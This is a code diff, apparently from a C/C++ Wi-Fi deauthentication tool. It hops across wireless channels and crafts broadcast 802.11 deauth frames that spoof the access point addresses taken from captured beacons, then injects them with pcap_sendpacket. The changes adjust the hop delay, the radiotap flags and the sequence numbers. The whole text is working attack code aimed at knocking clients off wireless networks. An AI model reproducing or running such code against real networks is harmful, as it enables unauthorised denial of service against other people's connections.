@@ -35,13 +35,10 @@ int channelChange(int sock, char* interface, iwrange range) {
 
     while(true) {
         for(int i = 0;i<len;i++) {
-            int start = (double)clock() / CLOCKS_PER_SEC;
-            int end = (((double)clock()) / CLOCKS_PER_SEC);
-            while(end - start < 1)
-                end = (((double)clock()) / CLOCKS_PER_SEC);
+            usleep(1000);
 
             memset(&wrq, 0, sizeof(struct iwreq));
-            wrq.u.freq.m = range.freq[i].m;
+            wrq.u.freq.m = range.freq[i].m; //freq
             wrq.u.freq.e = range.freq[i].e;
             wrq.u.freq.i = range.freq[i].i;
             wrq.u.freq.flags = range.freq[i].flags;
@@ -64,7 +61,6 @@ void usage() {
 
 int main(int argc, char* argv[]) {
     int res;
-    u_int16_t num = 0;
     iwrange range;
     double start, end;
 
@@ -112,7 +108,7 @@ int main(int argc, char* argv[]) {
             attackpk.radiohdr_.revision_ = 0x00;
             attackpk.radiohdr_.pad_ = 0x00;
             attackpk.radiohdr_.len_ = 0x000c;
-            attackpk.radiohdr_.presentflag_ = 0x00008004;
+            attackpk.radiohdr_.presentflag_ = 0x00000000;
             attackpk.datarate_ = 0x02;
             attackpk.pad_ = 0x00;
             attackpk.txflags_ = 0x0018;
@@ -122,7 +118,7 @@ int main(int argc, char* argv[]) {
             attackpk.beaconhdr_.addr1_ = Mac("ff:ff:ff:ff:ff:ff");
             attackpk.beaconhdr_.addr2_ = pk.dot11bf_.addr2_;
             attackpk.beaconhdr_.addr3_ = pk.dot11bf_.addr3_;
-            attackpk.beaconhdr_.fragseqnum_ = num << 4;
+            attackpk.beaconhdr_.fragseqnum_ = 0x0000;
             attackpk.fixedparam_ = 0x0007;
             res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attackpk), DEAUTHPACKET_LEN);
             printf("Deauth packet send channel: \n");
